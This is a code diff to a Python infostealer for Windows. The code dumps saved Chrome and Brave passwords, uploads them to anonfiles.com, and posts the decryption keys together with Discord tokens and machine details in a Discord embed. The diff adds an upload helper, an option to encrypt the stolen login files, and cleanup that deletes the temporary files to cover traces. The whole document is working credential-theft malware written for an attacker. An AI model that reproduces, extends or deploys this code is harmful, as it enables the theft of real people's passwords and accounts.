@@ -2,6 +2,7 @@ import os
 
 import brave
 import chrome
+import encryption
 
 if os.name != "nt":
     exit()
@@ -13,6 +14,12 @@ import requests
 import os
 import json
 import sys
+
+
+# CONFIG:
+# Encrypts the file sent to you including the login information of the user(This will also send you the dectryption key).
+# This is strongly recommended to prevent leaks, to other people, and if you test the code yourself and you don't have encryption ON. I'm sorry, but you're screwed.
+encrypt_loginInfo = True
 
 LOCAL = os.getenv("LOCALAPPDATA")
 TEMP = os.getenv("TEMP")
@@ -150,50 +157,53 @@ def has_payment_methods(token):
         pass
 
 
+def uploadFile(file):
+    url = 'https://api.anonfiles.com/upload'
+    chromelogin_path = file
+    files = {'file': (open(chromelogin_path, 'rb'))}
+    r2 = requests.post(url, files=files)
+    resp2 = json.loads(r2.text)
+    if resp2['status']:
+        loginUrl2 = resp2['data']['file']['url']['short']
+        return loginUrl2
+    else:
+        return "Anonfiles is down"
+
+
+browserInstalled = installedBrowser()
+
+
 def getlogininfo():
-    browserInstalled = installedBrowser()
+    global chromeKey
+    global braveKey
     if browserInstalled == "Chrome":
+        chromeFile = TEMP + r"\login.txt"
         chrome.get_password()
-        url = 'https://api.anonfiles.com/upload'
-        chromelogin_path = TEMP + r"\login.txt"
-        files = {'file': (open(chromelogin_path, 'rb'))}
-        r2 = requests.post(url, files=files)
-        resp2 = json.loads(r2.text)
-        if resp2['status']:
-            loginUrl2 = resp2['data']['file']['url']['short']
-            return loginUrl2
+        if encrypt_loginInfo is True:
+            chromeKey = encryption.encrypt_file(chromeFile)
+            return uploadFile(TEMP+r"\login.txt"+".enc")
         else:
-            return "Anonfiles is down"
+            return uploadFile(TEMP + r"\login.txt")
+
     if browserInstalled == "Brave":
         brave.get_password()
-        url = 'https://api.anonfiles.com/upload'
-        bravelogin_path = TEMP + r"\login.txt"
-        files = {'file': (open(bravelogin_path, 'rb'))}
-        r2 = requests.post(url, files=files)
-        resp2 = json.loads(r2.text)
-        if resp2['status']:
-            loginUrl2 = resp2['data']['file']['url']['short']
-            return loginUrl2
+        braveFile = TEMP + r"\login.txt"
+        if encrypt_loginInfo is True:
+            braveKey = encryption.encrypt_file(braveFile)
+            return uploadFile(TEMP+r"\login.txt"+".enc")
         else:
-            return "Anonfiles is down"
+            return uploadFile(TEMP + r"\login.txt")
     if browserInstalled == "Both":
         chrome.get_password()
         brave.get_password()
-        url = 'https://api.anonfiles.com/upload'
-        chromelogin_path = TEMP + r"\chromelogin.txt"
-        bravelogin_path = TEMP + r"\bravelogin.txt"
-        files = {'file': (open(chromelogin_path, 'rb'))}
-        r1 = requests.post(url, files=files)
-        files = {'file': (open(bravelogin_path, 'rb'))}
-        r2 = requests.post(url, files=files)
-        resp1 = json.loads(r1.text)
-        resp2 = json.loads(r2.text)
-        if resp1['status']:
-            loginUrl = resp1['data']['file']['url']['short']
-            loginUrl2 = resp2['data']['file']['url']['short']
-            return loginUrl + "\n" + loginUrl2
+        braveFile = TEMP + r"\bravelogin.txt"
+        chromeFile = TEMP + r"\chromelogin.txt"
+        if encrypt_loginInfo is True:
+            braveKey = encryption.encrypt_file(braveFile)
+            chromeKey = encryption.encrypt_file(chromeFile)
+            return uploadFile(braveFile + ".enc") + "\n" + uploadFile(chromeFile + ".enc")
         else:
-            return "Anonfiles is down"
+            return uploadFile(braveFile) + "\n" + uploadFile(chromeFile)
 
 
 def main():
@@ -284,7 +294,6 @@ def main():
                         "inline": True
 
                     },
-
                     {
 
                         "name": "**Computer Info**",
@@ -294,7 +303,6 @@ def main():
                         "inline": True
 
                     },
-
                     {
 
                         "name": "**Discord Token**",
@@ -313,7 +321,6 @@ def main():
                         "inline": False
 
                     }
-
                 ],
 
                 "author": {
@@ -323,8 +330,47 @@ def main():
                     "icon_url": avatar_url
 
                 }
-
             }
+            if encrypt_loginInfo is True:
+                if browserInstalled == "Brave":
+                    embed.get("fields").append({
+
+                        "name": "**Decryption Key for login.enc**",
+
+                        "value": f"`{braveKey}`",
+
+                        "inline": False
+
+                    })
+                elif browserInstalled == "Chrome":
+                    embed.get("fields").append({
+
+                        "name": "**Decryption Key for login.enc**",
+
+                        "value": f"`{chromeKey}`",
+
+                        "inline": False
+
+                    })
+                elif browserInstalled == "Both":
+                    embed.get("fields").append({
+
+                        "name": "**Decryption Key for bravelogin.enc**",
+
+                        "value": f"`{braveKey}`",
+
+                        "inline": False
+
+                    })
+                    embed.get("fields").append({
+
+                        "name": "**Decryption Key for chromelogin.enc**",
+
+                        "value": f"`{chromeKey}`",
+
+                        "inline": False
+
+                    })
 
             embeds.append(embed)
 
@@ -364,6 +410,26 @@ def main():
 try:
 
     main()
+    try:
+        os.remove(TEMP + r"\login.txt")
+    except Exception:
+        pass
+    try:
+        os.remove(TEMP + r"\bravelogin.txt")
+    except Exception:
+        pass
+    try:
+        os.remove(TEMP + r"\bravelogin.enc")
+    except Exception:
+        pass
+    try:
+        os.remove(TEMP + r"\chromelogin.txt")
+    except Exception:
+        pass
+    try:
+        os.remove(TEMP + r"\chromelogin.enc")
+    except Exception:
+        pass
 
 except Exception as e:
 
